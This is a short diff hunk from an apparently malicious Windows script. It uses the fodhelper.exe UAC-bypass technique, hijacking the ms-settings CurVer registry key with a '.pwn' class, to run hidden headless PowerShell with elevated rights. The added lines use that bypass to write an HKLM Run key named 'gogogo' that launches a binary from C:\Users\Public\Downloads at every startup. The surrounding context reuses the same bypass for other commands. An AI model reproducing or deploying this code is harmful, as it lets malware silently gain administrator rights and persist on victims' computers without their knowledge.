@@ -79,6 +79,11 @@ powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
 fodhelper.exe;
 cls
+powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run gogogo C:\Users\Public\Downloads\main""" -Force;
+powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
+powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
+fodhelper.exe;
+cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Start WUAUSERV""" -Force;
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force;
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force;
